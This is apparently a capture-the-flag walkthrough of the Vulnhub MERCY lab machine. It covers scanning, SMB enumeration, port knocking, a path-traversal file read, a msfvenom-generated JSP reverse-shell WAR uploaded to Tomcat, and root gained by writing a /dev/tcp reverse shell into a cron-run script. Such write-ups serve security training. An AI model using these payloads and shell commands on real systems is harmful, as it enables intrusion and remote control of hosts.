#port-knocking #tomcat #LFI #smb #heavy-enum #lateral-esc 
# Nmap
```
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_pop3-capabilities: UIDL SASL STLS TOP RESP-CODES AUTH-RESP-CODE PIPELINING CAPA
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more have post-login IMAP4rev1 listed capabilities STARTTLS SASL-IR ENABLE LOGINDISABLEDA0001 IDLE OK Pre-login ID LOGIN-REFERRALS LITERAL+
445/tcp  open     af46c7670   Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_imap-capabilities: more have IMAP4rev1 post-login listed AUTH=PLAINA0001 SASL-IR ENABLE capabilities IDLE OK Pre-login ID LOGIN-REFERRALS LITERAL+
995/tcp  open     ssl/pop3    Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_pop3-capabilities: UIDL USER SASL(PLAIN) TOP RESP-CODES AUTH-RESP-CODE PIPELINING CAPA
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-title: Apache Tomcat
MAC Address: 08:00:27:80:6F:A3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2023-09-14T00:57:07+08:00
| smb2-time: 
|   date: 2023-09-13T16:57:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2h40m04s, deviation: 4h37m07s, median: -4s
```

ports: 22 , 53 , 80 , 110 , 139 , 143 , 445 , 993 , 995 , 8080

# Port 8080
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230913225449.png]]
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230913231433.png]]
or why else it would give us the user-enum file
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914003917.png]]
# PORT 139
courtesy of enum4linux:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914003628.png]]

`qiu`
`password`
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914003539.png]]

when we go to the .private we see 2 directories `opensesme` `secrets` , and when we get the files of those:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005027.png]]

after port knocking:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005340.png]]
we get the port 80 open:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005659.png]]
in robots.txt:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005650.png]]
also in dirsearch:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005722.png]]
### mercy endpoint 
had this file  with dir-listing:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005808.png]]
### nomercy:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005840.png]]
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914005926.png]]
after this:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914010128.png]]
```txt
/windows/code.php?file=../../../../../../etc/passwd
```
at:
`http://192.168.211.193/nomercy/`
#### Login.html:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230914010448.png]]
we can get the file we mentioned above for the credentials:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916155920.png]]
`thisisasuperduperlonguser` `heartbreakisinevitable`
`fluffy` `freakishfluffybunny`
then we upload the mailicious war file:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916160128.png]]
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.211.130 LPORT=443 -f war -o maliciious_192_168_211_130_443.war
```
it looks like this:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916160521.png]]
we take the stable shell via:
***
step 1:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***
# Priv Esc
we have 4 users:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916160809.png]]
everyone's password is password except for `pleadformercy`
### superduperlonguser:
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916161050.png]]
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916161135.png]]
### QIU
when we look at the qiu's bash history there were some commands {look above ss} with sudo's permission , can we try?:
but it first ran the configprint file
nothing works!!!
### Fluffy
This user had the password same as that of manager-gui in the tomcat-user file , so when we get to it's shell insde the .private folder there was a .secret folder was containing the timestamp file which had the 777 permission , which contained some code that was writing the time to the /var/www/html file time which showed the current time 
IG that this must be cornjob for root as it was owned by root
we edit it and put `nc -e ....` but this doesn't work as the nc here is openbsd one 
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916181213.png]]
so we used this command:
```bash
0<&196;exec 196<>/dev/tcp/192.168.211.130/4444; sh <&196 >&196 2>&196
```
now we wait......
and.......
![[walkthroughs/Vulnhub/MERCY/IMG/Pasted image 20230916181017.png]]